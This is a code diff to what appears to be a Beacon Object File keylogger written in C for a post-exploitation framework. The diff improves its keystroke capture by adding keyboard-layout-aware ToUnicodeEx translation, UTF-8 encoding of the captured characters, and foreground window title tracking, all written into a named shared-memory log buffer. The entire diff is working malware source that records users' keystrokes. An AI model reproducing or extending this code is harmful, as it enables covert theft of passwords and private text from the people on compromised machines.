@@ -28,11 +28,14 @@ DECLSPEC_IMPORT DWORD  WINAPI USER32$MsgWaitForMultipleObjects(DWORD, CONST HAND
 
 DECLSPEC_IMPORT HWND   WINAPI USER32$GetForegroundWindow(void);
 DECLSPEC_IMPORT int    WINAPI USER32$GetWindowTextA(HWND, LPSTR, int);
+DECLSPEC_IMPORT int    WINAPI USER32$GetWindowTextW(HWND, LPWSTR, int);
 
+DECLSPEC_IMPORT DWORD  WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);
+DECLSPEC_IMPORT HKL    WINAPI USER32$GetKeyboardLayout(DWORD);
 DECLSPEC_IMPORT SHORT  WINAPI USER32$GetKeyState(int);
 DECLSPEC_IMPORT BOOL   WINAPI USER32$GetKeyboardState(PBYTE);
 DECLSPEC_IMPORT SHORT  WINAPI USER32$GetAsyncKeyState(int);
-DECLSPEC_IMPORT int    WINAPI USER32$ToUnicode(UINT, UINT, const BYTE*, LPWSTR, int, UINT);
+DECLSPEC_IMPORT int    WINAPI USER32$ToUnicodeEx(UINT, UINT, const BYTE*, LPWSTR, int, UINT, HKL);
 
 #define KEYLOG_MAGIC      0xDEADBEEF
 #define KEYLOG_MAP_NAME   "Local\\keylog_buf"
@@ -75,32 +78,29 @@ static void buf_write(const CHAR *data, DWORD len)
     KERNEL32$ReleaseMutex(g_hMutex);
 }
 
-static CHAR g_last_window[256] = {0};
-
-static const CHAR *normalize_title(const CHAR *title)
-{
-    while (*title == '*' || *title == '#' || *title == ' ')
-        title++;
-    return title;
-}
+static HWND g_last_hwnd = NULL;
+static HKL  g_fg_hkl   = NULL;
 
 static void process_key(DWORD vkCode, DWORD scanCode)
 {
 
     HWND hFg = USER32$GetForegroundWindow();
     if (hFg) {
-        CHAR win_title[256] = {0};
-        USER32$GetWindowTextA(hFg, win_title, sizeof(win_title) - 1);
+        WCHAR win_title_w[256] = {0};
+        USER32$GetWindowTextW(hFg, win_title_w, 255);
 
-        const CHAR *norm_new  = normalize_title(win_title);
-        const CHAR *norm_last = normalize_title(g_last_window);
+        CHAR win_title[512] = {0};
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, win_title_w, -1, win_title, sizeof(win_title) - 1, NULL, NULL);
 
-        if (MSVCRT$strcmp(norm_new, norm_last) != 0) {
+        MSVCRT$strncpy(g_ctx->active_window, win_title, sizeof(g_ctx->active_window) - 1);
 
-            MSVCRT$strncpy(g_last_window, win_title, sizeof(g_last_window) - 1);
-            MSVCRT$strncpy(g_ctx->active_window, win_title, sizeof(g_ctx->active_window) - 1);
+        DWORD fgTid = USER32$GetWindowThreadProcessId(hFg, NULL);
+        g_fg_hkl = USER32$GetKeyboardLayout(fgTid);
 
-            CHAR header[320];
+        if (hFg != g_last_hwnd) {
+            g_last_hwnd = hFg;
+
+            CHAR header[580];
             SYSTEMTIME st;
             KERNEL32$GetLocalTime(&st);
             int hlen = MSVCRT$_snprintf(header, sizeof(header) - 1,
@@ -126,13 +126,15 @@ static void process_key(DWORD vkCode, DWORD scanCode)
 
 
     WCHAR wch[4] = {0};
-    int conv = USER32$ToUnicode(vkCode, scanCode, keyState, wch, 4, 0);
+    int conv = USER32$ToUnicodeEx(vkCode, scanCode, keyState, wch, 4, 0, g_fg_hkl);
 
-    if (conv == 1 && wch[0] >= 0x20 && wch[0] < 0x7F) {
-
-        CHAR ch[2] = { (CHAR)wch[0], 0 };
-        buf_write(ch, 1);
-        return;
+    if (conv >= 1 && wch[0] >= 0x20) {
+        CHAR utf8[8] = {0};
+        int utf8_len = KERNEL32$WideCharToMultiByte( CP_UTF8, 0, wch, conv, utf8, sizeof(utf8) - 1, NULL, NULL);
+        if (utf8_len > 0) {
+            buf_write(utf8, (DWORD)utf8_len);
+            return;
+        }
     }
 
 
@@ -203,11 +205,7 @@ void go(char *args, int len)
     DWORD buf_bytes = (DWORD)buf_kb * 1024;
     DWORD map_size  = sizeof(KEYLOG_CTX) + buf_bytes;
 
-    g_hMap = KERNEL32$CreateFileMappingA(
-        INVALID_HANDLE_VALUE, NULL,
-        PAGE_READWRITE, 0, map_size,
-        KEYLOG_MAP_NAME);
-
+    g_hMap = KERNEL32$CreateFileMappingA( INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, map_size, KEYLOG_MAP_NAME);
     if (!g_hMap) {
         internal_printf("[-] CreateFileMappingA failed (err: %lu)\n", KERNEL32$GetLastError());
         printoutput(TRUE);
@@ -217,9 +215,7 @@ void go(char *args, int len)
 
     BOOL already_exists = (KERNEL32$GetLastError() == ERROR_ALREADY_EXISTS);
 
-    g_ctx = (KEYLOG_CTX*)KERNEL32$MapViewOfFile(
-        g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, map_size);
-
+    g_ctx = (KEYLOG_CTX*)KERNEL32$MapViewOfFile(g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, map_size);
     if (!g_ctx) {
         internal_printf("[-] MapViewOfFile failed (err: %lu)\n", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(g_hMap);
